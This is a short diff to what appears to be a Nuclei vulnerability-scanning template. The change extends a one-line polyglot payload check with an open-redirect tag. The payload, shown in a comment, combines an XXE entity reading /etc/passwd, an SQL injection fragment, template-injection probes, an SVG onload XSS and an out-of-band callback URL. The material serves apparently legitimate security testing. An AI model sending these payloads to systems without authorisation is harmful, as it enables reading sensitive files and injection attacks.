@@ -1,4 +1,4 @@
-id: xxe_sqli_xss_ssti_csti_one_line_nuclei_template
+id: xxe_sqli_xss_ssti_csti_ssrf_open_redirect_one_line_nuclei_template
 
 info:
   name: xxe_sqli_xss_ssti_csti_ssrf_open_redirect_one_line_payload
@@ -7,7 +7,7 @@ info:
   description: Check for multiple vulnerabilities in one payload.
   reference:
     - https://github.com/brinhosa/payloads
-  tags: xss,sqli,xxe,ssti,csti,ssrf
+  tags: xss,sqli,xxe,ssti,csti,ssrf,openredirect
 #<?xml version="1.0" encoding="UTF-8" ?><!-- 'or 1=1--><!-- "><%=7*7%>{{7*7}} --><!DOCTYPE
 test [ <!ENTITY x SYSTEM "file:///etc/passwd">]><stockCheck><productId>&x;</productId><storeId>1</storeId><![CDATA[<s><svg/onload=prompt(5);>&url=https://{{interactsh-url}}&b=]]></stockCheck>
 
